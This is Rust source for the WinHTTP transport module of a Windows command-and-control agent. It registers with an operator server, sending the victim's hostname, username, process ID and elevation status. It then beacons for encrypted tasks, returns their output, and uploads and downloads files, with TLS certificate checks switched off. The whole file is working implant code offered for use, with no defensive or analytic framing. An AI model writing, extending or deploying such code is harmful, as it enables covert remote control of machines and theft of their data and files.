/// HTTP/HTTPS transport using WinHTTP — same protocol as Go/Nim agents.
/// Registration: POST /register (plaintext JSON) → {"agent_id":"...","aes_key":"<b64>"}
/// Beacon:       GET  /beacon/<id> → AES-GCM {"tasks":[…]}; 204 = no tasks
/// Result:       POST /result/<id> → AES-GCM {"task_id":N,"output":"...","error":"..."}
/// Upload:       POST /upload/<id>/<name> → AES-GCM raw bytes
/// Download:     GET  /dl/<id>/<name> → AES-GCM raw bytes
use core::ffi::c_void;
use core::ptr;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde_json::Value;
use windows_sys::Win32::Networking::WinHttp::{
    WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest, WinHttpQueryHeaders,
    WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_SECURE, WINHTTP_OPTION_SECURITY_FLAGS,
    WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
};

use crate::{config, crypto};

// Self-signed cert ignore flags (standard WinHTTP constants)
const SEC_IGNORE_UNKNOWN_CA: u32      = 0x0100;
const SEC_IGNORE_CERT_WRONG_USAGE: u32 = 0x0200;
const SEC_IGNORE_CERT_CN_INVALID: u32  = 0x1000;
const SEC_IGNORE_CERT_DATE_INVALID: u32 = 0x2000;

// ── RAII handle wrapper ───────────────────────────────────────────────────────

struct WHandle(*mut c_void);
impl Drop for WHandle {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { WinHttpCloseHandle(self.0); }
        }
    }
}
impl WHandle {
    fn is_null(&self) -> bool { self.0.is_null() }
    fn raw(&self) -> *mut c_void { self.0 }
}

// ── Wide string helper ────────────────────────────────────────────────────────

fn wstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0u16)).collect()
}

// ── URL parser ────────────────────────────────────────────────────────────────

struct ParsedUrl {
    is_https: bool,
    host: String,
    port: u16,
    base: String, // path prefix (may be empty)
}

fn parse_url(url: &str) -> ParsedUrl {
    let (is_https, rest) = if url.starts_with("https://") {
        (true, &url[8..])
    } else if url.starts_with("http://") {
        (false, &url[7..])
    } else {
        (false, url)
    };
    let default_port: u16 = if is_https { 443 } else { 80 };

    let (host_port, base) = if let Some(i) = rest.find('/') {
        (&rest[..i], rest[i..].to_string())
    } else {
        (rest, String::new())
    };

    let (host, port) = if let Some(i) = host_port.rfind(':') {
        let p = host_port[i + 1..].parse().unwrap_or(default_port);
        (host_port[..i].to_string(), p)
    } else {
        (host_port.to_string(), default_port)
    };

    ParsedUrl { is_https, host, port, base }
}

// ── Core HTTP function ────────────────────────────────────────────────────────

pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    let p = parse_url(config::SERVER_URL);
    let full_path = format!("{}{}", p.base, path);

    let ua_w   = wstr(config::USER_AGENT);
    let host_w = wstr(&p.host);
    let meth_w = wstr(method);
    let path_w = wstr(&full_path);

    let secure = if p.is_https { WINHTTP_FLAG_SECURE } else { 0 };

    unsafe {
        let h_sess = WHandle(WinHttpOpen(
            ua_w.as_ptr(),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        ));
        if h_sess.is_null() { return None; }

        let h_conn = WHandle(WinHttpConnect(h_sess.raw(), host_w.as_ptr(), p.port, 0));
        if h_conn.is_null() { return None; }

        let h_req = WHandle(WinHttpOpenRequest(
            h_conn.raw(),
            meth_w.as_ptr(),
            path_w.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            secure,
        ));
        if h_req.is_null() { return None; }

        if p.is_https {
            let flags: u32 = SEC_IGNORE_UNKNOWN_CA
                | SEC_IGNORE_CERT_WRONG_USAGE
                | SEC_IGNORE_CERT_CN_INVALID
                | SEC_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(
                h_req.raw(),
                WINHTTP_OPTION_SECURITY_FLAGS,
                &flags as *const u32 as *const c_void,
                core::mem::size_of::<u32>() as u32,
            );
        }

        let body_ptr: *const c_void = if body.is_empty() {
            ptr::null()
        } else {
            body.as_ptr() as *const c_void
        };

        if WinHttpSendRequest(
            h_req.raw(),
            ptr::null(),
            0,
            body_ptr,
            body.len() as u32,
            body.len() as u32,
            0,
        ) == 0 { return None; }

        if WinHttpReceiveResponse(h_req.raw(), ptr::null_mut()) == 0 { return None; }

        let mut status: u32 = 0;
        let mut sz: u32 = 4;
        WinHttpQueryHeaders(
            h_req.raw(),
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            ptr::null(),
            &mut status as *mut u32 as *mut c_void,
            &mut sz,
            ptr::null_mut(),
        );

        let mut resp = Vec::new();
        let mut buf = [0u8; 8192];
        let mut got: u32 = 0;
        loop {
            if WinHttpReadData(
                h_req.raw(),
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut got,
            ) == 0 || got == 0 { break; }
            resp.extend_from_slice(&buf[..got as usize]);
        }

        Some((status, resp))
    }
}

// ── Agent transport ───────────────────────────────────────────────────────────

#[derive(Default)]
pub struct AgentTransport {
    pub agent_id: String,
    pub aes_key:  Vec<u8>,
    uri_idx:      usize,
    uri_list:     Vec<String>,
}

pub struct TaskWire {
    pub id:      i64,
    pub typ:     String,
    pub args:    String,
    pub payload: Vec<u8>,
}

impl AgentTransport {
    pub fn new() -> Self {
        let mut t = AgentTransport::default();
        if !config::BEACON_URIS.is_empty() {
            t.uri_list = config::BEACON_URIS.split(',').map(|s| s.to_string()).collect();
        }
        t
    }

    fn exe_name() -> String {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .unwrap_or_else(|| "agent.exe".to_string())
    }

    pub fn register(&mut self) -> bool {
        self.try_register().is_some()
    }

    fn is_elevated() -> bool {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::Security::{
            GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
        };
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
        unsafe {
            let mut token = 0isize;
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }
            let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut sz: u32 = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
            let ok = GetTokenInformation(
                token, TokenElevation,
                &mut elev as *mut _ as *mut core::ffi::c_void,
                sz, &mut sz,
            );
            CloseHandle(token);
            ok != 0 && elev.TokenIsElevated != 0
        }
    }

    fn try_register(&mut self) -> Option<()> {
        let body = serde_json::json!({
            "hostname":     std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
            "username":     std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
            "os":           if cfg!(target_arch = "x86_64") { "windows/amd64" } else { "windows/x86" },
            "pid":          std::process::id(),
            "transport":    config::TRANSPORT,
            "sleep_sec":    config::SLEEP_SEC,
            "jitter_pct":   config::JITTER_PCT,
            "process_name": Self::exe_name(),
            "is_admin":     Self::is_elevated(),
        });
        let (code, resp) = http_do("POST", "/register", body.to_string().as_bytes())?;
        if code != 200 || resp.is_empty() { return None; }
        let j: Value = serde_json::from_slice(&resp).ok()?;
        self.agent_id = j["agent_id"].as_str()?.to_string();
        self.aes_key  = STANDARD.decode(j["aes_key"].as_str()?).ok()?;
        Some(())
    }

    pub fn beacon(&mut self) -> Vec<TaskWire> {
        let path = if self.uri_list.is_empty() {
            format!("/beacon/{}", self.agent_id)
        } else {
            let uri = &self.uri_list[self.uri_idx % self.uri_list.len()];
            self.uri_idx += 1;
            format!("{}/{}", uri, self.agent_id)
        };
        let (code, resp) = http_do("GET", &path, &[]).unwrap_or((0, vec![]));
        if code == 204 || resp.is_empty() || code != 200 { return vec![]; }
        let plain = match crypto::open(&self.aes_key, &resp) {
            Some(p) => p,
            None => return vec![],
        };
        let j: Value = match serde_json::from_slice(&plain) {
            Ok(v) => v,
            Err(_) => return vec![],
        };
        let arr = match j["tasks"].as_array() {
            Some(a) => a,
            None => return vec![],
        };
        arr.iter().map(|t| TaskWire {
            id:      t["id"].as_i64().unwrap_or(0),
            typ:     t["type"].as_str().unwrap_or("").to_string(),
            args:    t.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            payload: t.get("payload")
                      .and_then(|v| v.as_str())
                      .filter(|s| !s.is_empty())
                      .and_then(|s| STANDARD.decode(s).ok())
                      .unwrap_or_default(),
        }).collect()
    }

    pub fn send_result(&self, task_id: i64, output: &str, error: &str) {
        self.send_result_admin(task_id, output, error, false);
    }

    pub fn send_result_admin(&self, task_id: i64, output: &str, error: &str, is_admin: bool) {
        if self.aes_key.is_empty() { return; }
        let plain = serde_json::json!({
            "task_id":  task_id,
            "output":   output,
            "error":    error,
            "is_admin": is_admin,
        }).to_string();
        let enc = crypto::seal(&self.aes_key, plain.as_bytes());
        let path = format!("/result/{}", self.agent_id);
        let _ = http_do("POST", &path, &enc);
    }

    pub fn upload_file(&self, _task_id: i64, filename: &str, data: &[u8]) {
        if self.aes_key.is_empty() { return; }
        let enc = crypto::seal(&self.aes_key, data);
        let path = format!("/upload/{}/{}", self.agent_id, filename);
        let _ = http_do("POST", &path, &enc);
    }

    pub fn download_file(&self, filename: &str) -> Vec<u8> {
        if self.aes_key.is_empty() { return vec![]; }
        let path = format!("/dl/{}/{}", self.agent_id, filename);
        let (code, resp) = http_do("GET", &path, &[]).unwrap_or((0, vec![]));
        if code != 200 || resp.is_empty() { return vec![]; }
        crypto::open(&self.aes_key, &resp).unwrap_or_default()
    }
}
